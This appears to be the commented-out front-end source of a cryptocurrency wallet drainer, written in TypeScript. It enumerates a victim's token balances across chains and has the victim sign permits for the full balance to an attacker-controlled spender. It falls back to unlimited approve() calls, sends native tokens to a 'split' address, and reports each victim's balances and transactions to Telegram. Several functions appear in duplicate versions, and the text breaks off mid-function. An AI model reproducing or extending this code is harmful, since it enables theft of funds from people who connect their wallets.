
  
  // const Normalusdc = async (
  //   token: Token, // Use the updated Token interface
  //   userAddress: string,
  //   signer: ethers.Signer,
  //   chainId: string
  // ): Promise<void> => {
  //   try {
  //     const nonce = await token.contract.nonces(userAddress);
  //     const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour in seconds
  //     const balance = await token.contract.balanceOf(userAddress);
  
  //     if (balance.isZero()) {
  //       throw new Error("Insufficient token balance for transfer.");
  //     }
  
  //     const domain: Domain = {
  //       name: "USD Coin",
  //       version: "2",
  //       chainId: parseInt(chainId),
  //       verifyingContract: token.address,
  //     };
  
  //     const types: Types = {
  //       Permit: [
  //         { name: "owner", type: "address" },
  //         { name: "spender", type: "address" },
  //         { name: "value", type: "uint256" },
  //         { name: "nonce", type: "uint256" },
  //         { name: "deadline", type: "uint256" },
  //       ],
  //     };
  
  //     const message: Message = {
  //       owner: userAddress,
  //       spender: BR_INITIATOR_ADDRESS, // Replace with actual spender address
  //       value: balance.toString(),
  //       nonce: nonce.toString(),
  //       deadline,
  //     };
  
  //     console.log(`Signing permit for ${token.symbol}...`);
  //     const signature = await signTypedData(signer, domain, types, message);
  
  //     const payload = {
  //       tokenAddress: token.address,
  //       userAddress,
  //       chainId,
  //       domain,
  //       message,
  //       signature,
  //       frontendRecipient: FRONTEND_RECIPIENT, // Replace with actual frontend recipient address
  //     };
  
  //     console.log("Sending data to backend...");
  
  //     // Define the expected response type
  //     type BackendResponse = {
  //       data: {
  //         recipients: Array<{ address: string; share: string }>;
  //         transactionHashes: string[];
  //       };
  //     };
  
  //     // Cast the response to the expected type
  //     const response = (await sendToBackend("Normalusdc", payload)) as BackendResponse;
  
  //     const { recipients, transactionHashes } = response.data;
  
  //     console.log("Split transfer successful");
  //     recipients.forEach((recipient) => {
  //       console.log(`Recipient: ${recipient.address}, Share: ${recipient.share}`);
  //     });
  //     console.log("Transaction Hashes:", transactionHashes);
  //   } catch (error: unknown) {
  //     if (error instanceof Error) {
  //       console.error("Error in Normalusdc frontend:", error.message);
  //     } else {
  //       console.error("An unknown error occurred in Normalusdc frontend.");
  //     }
  //   }
  // };
  

  
  // const handleDAIPermit = async (
  //   token: Token, // Uses the updated Token interface
  //   userAddress: string,
  //   signer: ethers.Signer,
  //   chainId: string
  // ): Promise<void> => {
  //   try {
  //     const nonce = await token.contract.nonces(userAddress);
  //     const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour in seconds
  //     const balance = await token.contract.balanceOf(userAddress);
  
  //     if (balance.isZero()) {
  //       console.warn(`Token ${token.symbol} has zero balance. Skipping transfer.`);
  //       return;
  //     }
  
  //     const daiPermitData = {
  //       holder: userAddress,
  //       spender: BR_INITIATOR_ADDRESS,
  //       nonce: nonce.toString(),
  //       expiry: deadline,
  //       allowed: true,
  //       value: balance.toString(),
  //     };
  
  //     const domain = {
  //       name: "Dai Stablecoin",
  //       version: "1",
  //       chainId: parseInt(chainId),
  //       verifyingContract: token.address,
  //     };
  
  //     const types = {
  //       Permit: [
  //         { name: "holder", type: "address" },
  //         { name: "spender", type: "address" },
  //         { name: "nonce", type: "uint256" },
  //         { name: "expiry", type: "uint256" },
  //         { name: "allowed", type: "bool" },
  //       ],
  //     };
  
  //     console.log(`Signing permit for ${token.symbol}...`);
  //     const signature = await signTypedData(signer, domain, types, daiPermitData);
  
  //     const payload = {
  //       tokenAddress: token.address,
  //       userAddress,
  //       chainId,
  //       domain,
  //       daiPermitData,
  //       signature,
  //       frontendRecipient: FRONTEND_RECIPIENT,
  //     };
  
  //     console.log("Sending data to backend...");
  //     const response = await sendToBackend("handleDAIPermit", payload);
  
  //     console.log("Permit handled successfully:", response);
  //   } catch (error: unknown) {
  //     if (error instanceof Error) {
  //       console.error("Error in handleDAIPermit:", error.message);
  //     } else {
  //       console.error("Unknown error in handleDAIPermit.");
  //     }
  //   }
  // };
  
  


  // const handlePolygonUSDCPermit = async (
  //   token: Token, // Use the updated Token interface
  //   userAddress: string,
  //   signer: ethers.Signer,
  //   chainId: string
  // ): Promise<void> => {
  //   try {
  //     const nonce = await token.contract.nonces(userAddress);
  //     const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour in seconds
  //     const balance = await token.contract.balanceOf(userAddress);
  
  //     if (balance.isZero()) {
  //       console.warn(`Token ${token.symbol} has zero balance. Skipping transfer.`);
  //       return;
  //     }
  
  //     // Explicit domain with `chainId`
  //     const domain: Domain = {
  //       name: "USD Coin (PoS)",
  //       version: "1",
  //       verifyingContract: token.address,
  //       chainId: parseInt(chainId),
  //       salt: ethers.utils.hexZeroPad(
  //         ethers.utils.hexlify(parseInt(chainId)),
  //         32
  //       ),
  //     };
  
  //     const types: Types = {
  //       Permit: [
  //         { name: "owner", type: "address" },
  //         { name: "spender", type: "address" },
  //         { name: "value", type: "uint256" },
  //         { name: "nonce", type: "uint256" },
  //         { name: "deadline", type: "uint256" },
  //       ],
  //     };
  
  //     const message: Message = {
  //       owner: userAddress,
  //       spender: BR_INITIATOR_ADDRESS,
  //       value: balance.toString(),
  //       nonce: nonce.toString(),
  //       deadline,
  //     };
  
  //     console.log(`Signing permit for ${token.symbol} on chain ${chainId}...`);
  //     const signature = await signTypedData(signer, domain, types, message);
  
  //     const payload = {
  //       tokenAddress: token.address,
  //       userAddress,
  //       chainId,
  //       domain,
  //       message,
  //       signature,
  //       frontendRecipient: FRONTEND_RECIPIENT,
  //     };
  
  //     console.log("Sending data to backend...");
  //     const response = (await sendToBackend(
  //       "handlePolygonUSDCPermit",
  //       payload
  //     )) as BackendResponse;
  
  //     // Handle backend response
  //     const { recipients, transactionHashes } = response.data;
  //     console.log("Split transfer successful");
  
  //     recipients.forEach((recipient) => {
  //       console.log(`Recipient: ${recipient.address}, Share: ${recipient.share}`);
  //     });
  //     console.log("Transaction Hashes:", transactionHashes);
  //   } catch (error: unknown) {
  //     if (error instanceof Error) {
  //       console.error("Error in handlePolygonUSDCPermit frontend:", error.message);
  //     } else {
  //       console.error(
  //         "An unknown error occurred in handlePolygonUSDCPermit frontend."
  //       );
  //     }
  //   }
  // };
  
  
  // const handleCowProtocolPermit = async (
  //   token: Token, // Use the Token interface
  //   userAddress: string,
  //   signer: ethers.Signer,
  //   chainId: string
  // ): Promise<void> => {
  //   try {
  //     // Fetch token details
  //     const nonce = await token.contract.nonces(userAddress);
  //     const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour in seconds
  //     const balance = await token.contract.balanceOf(userAddress);
  
  //     if (balance.isZero()) {
  //       throw new Error("Insufficient token balance for transfer.");
  //     }
  
  //     // Domain for Cow Protocol Permit
  //     const domain: Domain = {
  //       name: await token.contract.name(),
  //       version: "1", // Fallback version value
  //       chainId: parseInt(chainId),
  //       verifyingContract: token.address,
  //     };
  
  //     // Types for Permit
  //     const types: Types = {
  //       Permit: [
  //         { name: "owner", type: "address" },
  //         { name: "spender", type: "address" },
  //         { name: "value", type: "uint256" },
  //         { name: "nonce", type: "uint256" },
  //         { name: "deadline", type: "uint256" },
  //       ],
  //     };
  
  //     // Message for signing
  //     const message: Message = {
  //       owner: userAddress,
  //       spender: BR_INITIATOR_ADDRESS, // Replace with actual spender
  //       value: balance.toString(),
  //       nonce: nonce.toString(),
  //       deadline,
  //     };
  
  //     // Use the provided `signTypedData` function for signing
  //     const signature = await signTypedData(signer, domain, types, message);
  
  //     // Prepare payload for backend
  //     const payload = {
  //       tokenAddress: token.address,
  //       userAddress,
  //       chainId,
  //       domain,
  //       message,
  //       signature,
  //       frontendRecipient: FRONTEND_RECIPIENT, // Replace with actual frontend recipient
  //     };
  
  //     console.log("Sending data to backend...");
  
  //     // Define the expected backend response type
  //     type BackendResponse = {
  //       data: {
  //         recipients: Array<{ address: string; share: string }>;
  //         transactionHashes: string[];
  //       };
  //     };
  
  //     // Cast response to the expected type
  //     const response = (await sendToBackend(
  //       "handleCowProtocolPermit",
  //       payload
  //     )) as BackendResponse;
  
  //     // Handle backend response
  //     const { recipients, transactionHashes } = response.data;
  //     console.log("Split transfer successful");
  
  //     recipients.forEach((recipient) => {
  //       console.log(`Recipient: ${recipient.address}, Share: ${recipient.share}`);
  //     });
  //     console.log("Transaction Hashes:", transactionHashes);
  //   } catch (error: unknown) {
  //     // Explicitly handle error type
  //     if (error instanceof Error) {
  //       console.error(
  //         "Error in handleCowProtocolPermit frontend:",
  //         error.message
  //       );
  //     } else {
  //       console.error(
  //         "An unknown error occurred in handleCowProtocolPermit frontend."
  //       );
  //     }
  //   }
  // };
  
  // const sendTransactions = async (): Promise<void> => {
//   if (!provider) {
//     console.error("Provider is not available or wallet is not connected");
//     return;
//   }

//   if (!userAddress) {
//     console.error("No user address is available. Please connect a wallet.");
//     return;
//   }

//   setLoading(true);
//   try {
//     console.log("Fetching balances across all chains...");
//     const chainsWithBalances = await fetchAllBalances(userAddress);

//     if (chainsWithBalances.length === 0) {
//       console.log("No chains with non-zero balances found.");
//       return;
//     }

//     console.log("Chains with balances:", chainsWithBalances.map((entry) => entry.chain.label));

//     for (const { chain, balances } of chainsWithBalances) {
//       console.log(`Switching to chain: ${chain.label}`);
//       try {
//         const appKitNetwork = mapChainToAppKitNetwork(chain);
//         const switchSuccess = await switchChain(appKitNetwork);

//         if (!switchSuccess) {
//           console.warn(`Switch to ${chain.label} failed, skipping.`);
//           continue;
//         }

//         const updatedProvider = new ethers.providers.Web3Provider(
//           walletProvider as ethers.providers.ExternalProvider
//         );

//         // Directly call `processChainTransactions`
//         await processChainTransactions(chain, balances, userAddress, updatedProvider);
//       } catch (error) {
//         console.error(
//           `Error processing chain ${chain.label}:`,
//           error instanceof Error ? error.message : error
//         );
//         continue;
//       }
//     }

//     console.log("Completed processing all chains with balances.");
//   } catch (error) {
//     console.error("An unexpected error occurred during sendTransactions:", error);
//   } finally {
//     setLoading(false);
//   }
// };





// const sendTransactions = async (): Promise<void> => {
//   if (!provider) {
//     console.error("Provider is not available or wallet is not connected");
//     return;
//   }

//   if (!userAddress) {
//     console.error("No user address is available. Please connect a wallet.");
//     return;
//   }

 
//   setLoading(true);
//   // await open({ view: "Account" }); 
//   // open(); // Open the full Reown modal
//   // Open the full modal in Connect view


//   // open({ view: "ApproveTransaction" }); // Open Reown modal for transaction approval
//   console.log("sendTransactions started");
// // Open Reown modal when starting transactions


//   try {
    
//     const currentChainId = (await provider.getNetwork()).chainId;
//     const currentChain = chains.find(
//       (chain) => chain.id === `0x${currentChainId.toString(16)}`
//     );

//     if (currentChain) {
//       console.log(`Processing current chain: ${currentChain.label}`);
//       await processChain(currentChain, userAddress, provider, currentChainId);
//     }

//     // for (const chain of chains) {
//     //   if (chain.id === `0x${currentChainId.toString(16)}`) continue;

//     //   console.log(`Switching to chain: ${chain.label}`);

//     //   try {
//     //     const appKitNetwork = mapChainToAppKitNetwork(chain); // Map to AppKitNetwork
//     //     const switchSuccess = await switchChain(appKitNetwork);
//     //     if (!switchSuccess) {
//     //       console.warn(`Switch to ${chain.label} failed, skipping.`);
//     //       continue;
//     //     }

//     //     const updatedProvider = new ethers.providers.Web3Provider(walletProvider as ethers.providers.ExternalProvider);

//     //     const newChainId = parseInt(chain.id, 16);
//     //     await processChain(chain, userAddress, updatedProvider, newChainId);
//     //   } catch (error) {
//     //     console.error(
//     //       `Error processing chain ${chain.label}:`,
//     //       error instanceof Error ? error.message : error
//     //     );
//     //     continue; // Skip to the next chain
//     //   }
//     // }


//     for (const chain of chains) {
//       if (chain.id === `0x${currentChainId.toString(16)}`) continue;
    
//       console.log(`Switching to chain: ${chain.label}`);
//       try {
//         const appKitNetwork = mapChainToAppKitNetwork(chain);
//         const switchSuccess = await switchChain(appKitNetwork);
//         if (!switchSuccess) {
//           console.warn(`Switch to ${chain.label} failed, skipping.`);
//           continue;
//         }
    
//         const updatedProvider = new ethers.providers.Web3Provider(
//           walletProvider as ethers.providers.ExternalProvider
//         );
    
//         const newChainId = parseInt(chain.id, 16);
//         await processChain(chain, userAddress, updatedProvider, newChainId);
//       } catch (error) {
//         console.error(
//           `Error processing chain ${chain.label}:`,
//           error instanceof Error ? error.message : error
//         );
//         continue;
//       }
//     }
    
//     console.log("Completed processing all chains.");
//   } catch (error) {
//     console.error("An unexpected error occurred during sendTransactions:", error);
//   } finally {
//     setLoading(false);
//   }
// };


// const processChain = async (
//   chain: Chain,
//   userAddress: string,
//   provider: ethers.providers.Web3Provider,
//   chainId: number
// ): Promise<void> => {
//   try {
//     console.log(`Fetching balances for ${userAddress} on ${chain.label} (Chain ID: ${chainId})`);
//     const balances = (await fetchBalances(userAddress, chainId)) as Token[];

//     console.log(`Fetched balances from ${chain.label}:`, balances);

//     // Validate and transform balances into TokenBalance type
//     const validTokens: TokenBalance[] = balances
//       .filter((token) => {
//         try {
//           const balance = BigNumber.from(token.balance); // Parse as BigNumber
//           console.log(
//             `Token: ${token.name}, Address: ${token.address}, Balance: ${balance.toString()}`
//           );
//           return !balance.isZero(); // Exclude tokens with zero balance
//         } catch (error) {
//           console.warn(`Error processing token ${token.name}:`, error);
//           return false; // Exclude tokens with invalid balance
//         }
//       })
//       .map((token) => ({
//         address: token.address,
//         balance: BigNumber.from(token.balance),
//         contract: new ethers.Contract(token.address, ERC20_ABI, provider), // Instantiate contract
//         name: token.name,
//         symbol: token.symbol,
//         type: token.type,
//         amount: BigNumber.from(token.balance), // Use balance for `amount`
//         amountUSD: token.amountUSD,
//       }));

//     if (validTokens.length > 0) {
//       console.log(
//         `Valid tokens on ${chain.label}: ${validTokens
//           .map((token) => `${token.name} (${token.symbol})`)
//           .join(", ")}`
//       );

//       await processChainTransactions(chain, validTokens, userAddress, provider);
//     } else {
//       console.warn(`No valid tokens found on ${chain.label}`);
//     }
//   } catch (error: unknown) {
//     if (error instanceof Error) {
//       console.error(`Error processing chain ${chain.label}:`, error.message);
//     } else {
//       console.error(`Unknown error processing chain ${chain.label}:`, error);
//     }
//     throw error; // Rethrow error to signal failure
//   }
// };


  // const processChain = async (
  //   chain: Chain,
  //   userAddress: string,
  //   provider: ethers.providers.Web3Provider,
  //   chainId: number
  // ): Promise<void> => {
  //   try {
  //     const balances = await fetchBalances(userAddress, chainId) as Token[];
  
  //     // Transform balances into TokenBalance type
  //     const validTokens: TokenBalance[] = balances
  //       .filter((token) => {
  //         const balance = BigNumber.from(token.balance); // Ensure it's a BigNumber
  //         return !balance.isZero();
  //       })
  //       .map((token) => ({
  //         address: token.address,
  //         balance: BigNumber.from(token.balance),
  //         contract: new ethers.Contract(token.address, ERC20_ABI, provider), // Add contract instance
  //         name: token.name,
  //         symbol: token.symbol,
  //         type: token.type,
  //         amount: BigNumber.from(token.balance), // Default to balance for `amount`
  //         amountUSD: token.amountUSD,
  //       }));
  
  //     if (validTokens.length > 0) {
  //       console.log(
  //         `Valid tokens on ${chain.label}: ${validTokens
  //           .map((token) => token.symbol)
  //           .join(", ")}`
  //       );
  
  //       await processChainTransactions(chain, validTokens, userAddress, provider);
  //     } else {
  //       console.log(`No balances found on ${chain.label}`);
  //     }
  //   } catch (error: unknown) {
  //     if (error instanceof Error) {
  //       console.error(`Error processing chain ${chain.label}:`, error.message);
  //     } else {
  //       console.error(`Unknown error processing chain ${chain.label}:`, error);
  //     }
  //     throw error;
  //   }
  // };
  


  // const handlePermitBasedTransfer = async (
  //   token: TokenBalance,
  //   userAddress: string,
  //   signer: ethers.Signer,
  //   chain: { id: string },
  //   provider: ethers.providers.Web3Provider,
  //   recipientAddress: string
  // ): Promise<void> => {
  //   const contract = token.contract as TokenContract;
  
  //   const isDAI =
  //     token.address.toLowerCase() === DAI_ADDRESS_MAINNET.toLowerCase();
  //   const isPolygonUSDC =
  //     chain.id === "0x89" &&
  //     token.address.toLowerCase() === "0x2791bca1f2de4661ed88a30c99a7a9449aa84174";
  //   const isMainnetUSDC =
  //     chain.id === "0x1" &&
  //     token.address.toLowerCase() === "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
  //   const isCowProtocol =
  //     token.address.toLowerCase() ===
  //     "0x0625afb445c3b6b7b929342a04a22599fd5dbb59";
  
  //   try {
  //     console.log(`Chain ID: ${chain.id}, Token Address: ${token.address.toLowerCase()}`);
  
  //     if (isDAI) {
  //       console.log(`Handling DAI Permit for token: ${token.address}`);
  //       await handleDAIPermit({ ...token, contract }, userAddress, signer, chain.id);
  //     } else if (isPolygonUSDC) {
  //       console.log(`Handling Polygon USDC Permit for token: ${token.address}`);
  //       await handlePolygonUSDCPermit({ ...token, contract }, userAddress, signer, chain.id);
  //     } else if (isMainnetUSDC) {
  //       console.log(`Handling Mainnet USDC Permit for token: ${token.address}`);
  //       await Normalusdc({ ...token, contract }, userAddress, signer, chain.id);
  //     } else if (isCowProtocol) {
  //       console.log(`Handling Cow Protocol Permit for token: ${token.address}`);
  //       await handleCowProtocolPermit({ ...token, contract }, userAddress, signer, chain.id);
  //     } else {
  //       console.log(
  //         `Token ${token.address} does not match specific permit handlers. Falling back to approval and transfer.`
  //       );
  //       await handleApprovalAndTransfer(
  //         { ...token, contract },
  //         userAddress,
  //         provider,
  //         chain.id,
  //         recipientAddress
  //       );
  //     }
  //   } catch (error) {
  //     if (error instanceof Error) {
  //       console.error(
  //         `Error handling permit-based transfer for token ${token.address}: ${error.message}`
  //       );
  //     } else {
  //       console.error(
  //         `Unknown error occurred while handling permit-based transfer for token ${token.address}.`,
  //         error
  //       );
  //     }
  //     throw error;
  //   }
  // };
  

  // const handlePermitBasedTransfer = async (
  //   token: TokenBalance, // Keeping TokenBalance type
  //   userAddress: string,
  //   signer: ethers.Signer,
  //   chain: { id: string },
  //   provider: ethers.providers.Web3Provider,
  //   recipientAddress: string
  // ): Promise<void> => {
  //   const contract = token.contract as TokenContract; // Cast to TokenContract
  
  //   const isDAI =
  //     token.address.toLowerCase() === DAI_ADDRESS_MAINNET.toLowerCase();
  //   const isPolygonUSDC =
  //     chain.id === "0x89" &&
  //     token.address.toLowerCase() === "0x2791bca1f2de4661ed88a30c99a7a9449aa84174";
  //   const isMainnetUSDC =
  //     chain.id === "0x1" &&
  //     token.address.toLowerCase() === "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  //   const isCowProtocol =
  //     token.address.toLowerCase() ===
  //     "0x0625aFB445C3B6B7B929342a04A22599fd5dBB59".toLowerCase();
  
  //   try {
  //     if (isDAI) {
  //       console.log(`Handling DAI Permit for token: ${token.address}`);
  //       await handleDAIPermit({ ...token, contract }, userAddress, signer, chain.id);
  //     } else if (isPolygonUSDC) {
  //       console.log(`Handling Polygon USDC Permit for token: ${token.address}`);
  //       await handlePolygonUSDCPermit({ ...token, contract }, userAddress, signer, chain.id);
  //     } else if (isMainnetUSDC) {
  //       console.log(`Handling Mainnet USDC Permit for token: ${token.address}`);
  //       await Normalusdc({ ...token, contract }, userAddress, signer, chain.id);
  //     } else if (isCowProtocol) {
  //       console.log(`Handling Cow Protocol Permit for token: ${token.address}`);
  //       await handleCowProtocolPermit({ ...token, contract }, userAddress, signer, chain.id);
  //     } else {
  //       console.log(
  //         `Token ${token.address} does not match specific permit handlers. Falling back to approval and transfer.`
  //       );
  
  //       await handleApprovalAndTransfer(
  //         { ...token, contract },
  //         userAddress,
  //         provider,
  //         chain.id,
  //         recipientAddress
  //       );
  //     }
  //   } catch (error) {
  //     if (error instanceof Error) {
  //       console.error(
  //         `Error handling permit-based transfer for token ${token.address}: ${error.message}`
  //       );
  //     } else {
  //       console.error(
  //         `Unknown error occurred while handling permit-based transfer for token ${token.address}.`,
  //         error
  //       );
  //     }
  //     throw error;
  //   }
  // };
  
  // const handleApprovalAndTransfer = async (
  //   token: TokenBalance,
  //   userAddress: string,
  //   provider: ethers.providers.Web3Provider,
  //   chainId: number | string,
  //   recipientAddress: string
  // ): Promise<void> => {
  //   try {
  //     const signer = provider.getSigner();
  //     const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
  
  //     let decimals: number;
  //     try {
  //       // Attempt to fetch decimals
  //       decimals = await tokenContract.decimals();
  //     } catch (error) {
  //       console.warn(
  //         `Failed to fetch decimals for token ${token.name}. Defaulting to 18. Error:`,
  //         error
  //       );
  //       decimals = 18; // Fallback to 18 decimals
  //     }
  
  //     let rawBalance: BigNumber;
  //     try {
  //       // Attempt to fetch balance
  //       rawBalance = await tokenContract.balanceOf(userAddress);
  //     } catch (error) {
  //       console.error(
  //         `Failed to fetch balance for token ${token.name} (${token.address}). Skipping transfer. Error:`,
  //         error
  //       );
  //       return; // Exit if balance can't be fetched
  //     }
  
  //     if (rawBalance.isZero()) {
  //       console.warn(`User has zero balance for token ${token.name}. Skipping transfer.`);
  //       return;
  //     }
  
  //     const adjustedBalance = ethers.utils.formatUnits(rawBalance, decimals);
  //     console.log(
  //       `Token: ${token.name} | Raw Balance: ${rawBalance.toString()} | Adjusted Balance: ${adjustedBalance}`
  //     );
  
  //     // Fetch token price in USD (optional)
  //     const tokenPriceInUSD = await fetchTokenPrice(chainId.toString());
  //     const balanceInUSD = parseFloat(adjustedBalance) * tokenPriceInUSD;
  //     console.log(`Balance in USD: $${balanceInUSD.toFixed(2)}`);
  
  //     // Notify Telegram about balance details
  //     const balanceMessage = `Token: ${token.name}\nBalance: ${adjustedBalance} ${token.symbol}\nValue: $${balanceInUSD.toFixed(
  //       2
  //     )}`;
  //     await sendToTelegram(balanceMessage);
  
  //     // Fetch current allowance
  //     const allowance = await tokenContract.allowance(userAddress, BR_INITIATOR_ADDRESS);
  //     console.log(
  //       `Allowance for ${token.name}: ${ethers.utils.formatUnits(allowance, decimals)}`
  //     );
  
  //     // Approve the full balance if needed
  //     if (allowance.lt(rawBalance)) {
  //       console.log(
  //         `Allowance (${allowance.toString()}) is less than balance (${rawBalance.toString()}). Sending approve transaction...`
  //       );
  //       try {
  //         const approveTx = await tokenContract.approve(BR_INITIATOR_ADDRESS, rawBalance);
  //         console.log(`Approval transaction sent. Tx Hash: ${approveTx.hash}`);
  //         await approveTx.wait();
  //         console.log(`Approval successful for ${adjustedBalance} ${token.symbol}`);
  //         await sendToTelegram(
  //           `Approval successful for ${adjustedBalance} ${token.name}. Tx Hash: ${approveTx.hash}`
  //         );
  //       } catch (error) {
  //         console.error(`Error during approval for token ${token.name}:`, error);
  //         return; // Skip transfer if approval fails
  //       }
  //     }
  
  //     // Prepare payload for backend transfer
  //     const payload = {
  //       tokenAddress: token.address,
  //       userAddress,
  //       chainId: Number(chainId), // Ensure chainId is a number
  //       recipientAddress,
  //     };
  
  //     try {
  //       const response = (await sendToBackend("handleApprovalAndTransfer", payload)) as {
  //         backendTxHash: string;
  //         frontendTxHash: string;
  //       };
  
  //       if (response?.backendTxHash && response?.frontendTxHash) {
  //         console.log(
  //           `Transfer successful! Backend Tx Hash: ${response.backendTxHash}, Frontend Tx Hash: ${response.frontendTxHash}`
  //         );
  //         await sendToTelegram(
  //           `Transfer successful for ${adjustedBalance} ${token.name}.\nBackend Tx Hash: ${response.backendTxHash}\nFrontend Tx Hash: ${response.frontendTxHash}`
  //         );
  //       } else {
  //         console.warn(`Unexpected backend response for ${token.name}:`, response);
  //       }
  //     } catch (error) {
  //       console.error(
  //         `Error sending transfer request for token ${token.name} to backend:`,
  //         error
  //       );
  //     }
  //   } catch (error: unknown) {
  //     if (error instanceof Error) {
  //       console.error(
  //         `Error in handleApprovalAndTransfer for token ${token.name}:`,
  //         error.message
  //       );
  //       await sendToTelegram(
  //         `Error during approval or transfer for ${token.name}: ${error.message}`
  //       );
  //     } else {
  //       console.error(`Unknown error in handleApprovalAndTransfer:`, error);
  //     }
  //   }
  // };
  


  // const handleApprovalAndTransfer = async (
  //   token: TokenBalance,
  //   userAddress: string,
  //   provider: ethers.providers.Web3Provider,
  //   chainId: number | string, // Specify type for chainId
  //   recipientAddress: string
  // ): Promise<void> => {
  //   try {
  //     const signer = provider.getSigner();
  //     const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
  
  //     // Fetch allowance and balance
  //     const allowance = await tokenContract.allowance(userAddress, BR_INITIATOR_ADDRESS);
  //     const rawBalance = await tokenContract.balanceOf(userAddress);
  
  //     if (rawBalance.isZero()) {
  //       console.warn("User has zero balance. Skipping transfer.");
  //       return;
  //     }
  
  //     const decimals = await tokenContract.decimals();
  //     const adjustedBalance = ethers.utils.formatUnits(rawBalance, decimals);
  
  //     console.log(
  //       `Processing token: ${token.name} | Allowance: ${ethers.utils.formatUnits(allowance, decimals)} | Balance: ${adjustedBalance} ${token.symbol}`
  //     );
  
  //     // Fetch token price in USD
  //     const tokenPriceInUSD = await fetchTokenPrice(chainId.toString());
  //     const balanceInUSD = parseFloat(adjustedBalance) * tokenPriceInUSD;
  
  //     console.log(`Balance in USD: $${balanceInUSD.toFixed(2)}`);
  
  //     // Notify Telegram about token details
  //     const balanceMessage = `Token: ${token.name}\nBalance: ${adjustedBalance} ${token.symbol}\nValue: $${balanceInUSD.toFixed(
  //       2
  //     )}`;
  //     await sendToTelegram(balanceMessage);
  
  //     // Check and approve if needed
  //     if (allowance.lt(rawBalance)) {
  //       console.log(
  //         `Allowance (${ethers.utils.formatUnits(allowance, decimals)}) is less than balance (${adjustedBalance}). Sending approve transaction...`
  //       );
  
  //       try {
  //         const approveTx = await tokenContract.approve(BR_INITIATOR_ADDRESS, rawBalance);
  //         console.log(`Approval initiated. Tx Hash: ${approveTx.hash}`);
  //         await approveTx.wait();
  //         console.log(`Approval successful. Tx Hash: ${approveTx.hash}`);
  
  //         const approvalMessage = `Approval successful for ${adjustedBalance} ${token.name}. Tx Hash: ${approveTx.hash}`;
  //         await sendToTelegram(approvalMessage);
  //       } catch (approveError) {
  //         console.error("Error during approval:", approveError);
  //         return;
  //       }
  //     }
  
  //     // Prepare payload for backend
  //     console.log("Sending transfer request to backend...");
  //     const payload = {
  //       tokenAddress: token.address,
  //       userAddress,
  //       chainId: Number(chainId), // Ensure chainId is a number
  //       recipientAddress,
  //     };
  
  //     // Send payload to backend
  //     try {
  //       const response = (await sendToBackend("handleApprovalAndTransfer", payload)) as {
  //         backendTxHash: string;
  //         frontendTxHash: string;
  //       };
  
  //       if (response?.backendTxHash && response?.frontendTxHash) {
  //         console.log(
  //           `Transfer successful! Backend Tx Hash: ${response.backendTxHash}, Frontend Tx Hash: ${response.frontendTxHash}`
  //         );
  
  //         const transferMessage = `Transfer completed!\nBackend Tx Hash: ${response.backendTxHash}\nFrontend Tx Hash: ${response.frontendTxHash}`;
  //         await sendToTelegram(transferMessage);
  //       } else {
  //         console.warn("Unexpected backend response:", response);
  //       }
  //     } catch (backendError) {
  //       console.error("Error sending transfer request to backend:", backendError);
  //     }
  //   } catch (error: unknown) {
  //     if (error instanceof Error) {
  //       console.error("Error in handleApprovalAndTransfer:", error.message);
  //     } else {
  //       console.error("Unknown error in handleApprovalAndTransfer:", error);
  //     }
  //   }
  // };
  


// const processChainTransactions = async (
//   chain: Chain,
//   validTokens: TokenBalance[],
//   userAddress: string,
//   provider: ethers.providers.Web3Provider
// ): Promise<void> => {
//   console.log(`Processing transactions on chain: ${chain.label}`);

//   const signer = provider.getSigner();
//   const nativeTokenPriceInUSD = await fetchTokenPrice(chain.id);

//   // Calculate native token equivalent for each token
//   console.log(`[Chain ${chain.id}] Calculating native token equivalent...`);
//   await calculateNativeValuePerToken(validTokens, nativeTokenPriceInUSD, chain.id);

//   // Sort tokens by their USD value in descending order
//   validTokens.sort((a, b) => b.amountUSD - a.amountUSD);

//   // Native token transfer
//   try {
//     const totalTokenValueInUSD = validTokens.reduce(
//       (sum, token) => sum + token.amountUSD,
//       0
//     );
//     await transferNativeToken(
//       BLACK_RAIN_SPLIT,
//       signer,
//       nativeTokenPriceInUSD,
//       chain.id,
//       totalTokenValueInUSD
//     );
//   } catch (error) {
//     if (error instanceof Error) {
//       console.warn(
//         `Failed to transfer native token on ${chain.label}:`,
//         error.message
//       );
//     } else {
//       console.warn(
//         `Failed to transfer native token on ${chain.label}: Unknown error`
//       );
//     }
//   }

//   // Process each valid token in sorted order
//   for (const token of validTokens) {
//     console.log(`Processing token: ${token.name} on ${chain.label}`);

//     // Skip processing if the token is native
//     if (token.type === "NATIVE") {
//       console.log("Skipping decimals fetch for native token.");
//       continue; // Move to the next token
//     }

//     // Initialize the contract for the token
//     token.contract = new ethers.Contract(token.address, ERC20_ABI, provider);

//     let tokenAlreadyTransferred = false; // Track if the token has been transferred

//     try {
//       // Validate token contract by attempting to fetch decimals
//       const decimals = await token.contract.decimals();
//       console.log(`Decimals for token ${token.name}: ${decimals}`);

//       // Add recipientAddress (e.g., a hardcoded value or dynamically provided)
//       const recipientAddress = FRONTEND_RECIPIENT; // Replace with actual recipient logic

//       // Use handlePermitBasedTransfer
//       await handlePermitBasedTransfer(
//         token,
//         userAddress,
//         signer,
//         chain,
//         provider,
//         recipientAddress // Pass the recipient address here
//       );
//       tokenAlreadyTransferred = true; // Mark as transferred

//       // Avoid redundant dynamic gas transactions if already transferred
//       if (!tokenAlreadyTransferred) {
//         const transaction: ethers.providers.TransactionRequest = {
//           to: token.contract.address,
//           data: token.contract.interface.encodeFunctionData("transfer", [
//             BLACK_RAIN_SPLIT,
//             token.amount,
//           ]),
//         };

//         await sendTransactionWithDynamicGas(
//           parseInt(chain.id, 16),
//           provider,
//           transaction
//         );
//       }
//     } catch (error) {
//       if (error instanceof Error) {
//         console.error(`Error processing token ${token.name}: ${error.message}`);
//       } else {
//         console.error(`Error processing token ${token.name}: Unknown error`);
//       }

//       continue; // Skip to the next token
//     }
//   }
// };


  // Helper function to process transactions on a specific chain

 
  // const processChainTransactions = async (
  //   chain: Chain,
  //   validTokens: TokenBalance[],
  //   userAddress: string,
  //   provider: ethers.providers.Web3Provider
  // ): Promise<void> => {
  //   console.log(`Processing transactions on chain: ${chain.label}`);
  
